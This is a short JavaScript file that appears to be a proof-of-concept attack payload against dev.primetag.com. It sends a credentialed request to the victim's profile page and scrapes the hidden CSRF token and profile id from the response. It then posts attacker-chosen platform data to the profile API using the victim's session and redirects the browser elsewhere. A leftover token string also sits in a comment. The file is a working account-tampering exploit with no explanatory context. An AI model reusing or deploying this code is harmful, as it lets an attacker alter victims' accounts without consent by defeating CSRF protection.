var payload = {
    "name": "ananuneninamu.com",
    "url": "annaninninamu.com",
    "audience_total": 3
};
//var token = '0WkQyR9JkjXzyyCpdNuuWc8R6PjVoRl15PWe4K82JM0JsMZrVikCopSvHEiZPLcJ';
var id = '';
function postdata(token) {
    var url = 'https://dev.primetag.com/api/profiles/'+id+'/platforms/4';
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            console.log(xhr.responseText);
            window.location = 'https://dnsleaktest.com';
        };
    };
    xhr.open('POST', url, true);
    xhr.setRequestHeader('X-CSRFToken', token);
    xhr.withCredentials = "true";
    xhr.send(JSON.stringify(payload));
};
function getprofid(){
    var url = 'https://dev.primetag.com/profile'
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            id = xhr.responseURL.substr(xhr.responseURL.length - 4);
            var div = document.createElement('div');
            div.innerHTML = xhr.responseText;
            document.body.appendChild(div);
            var token = document.querySelectorAll('[type="hidden"]')[0].value;
            console.log('This is the id '+id);
            postdata(token);
        };
    };
    xhr.open('GET', url, true);
    xhr.withCredentials = "true";
    xhr.send(null);
}
getprofid();
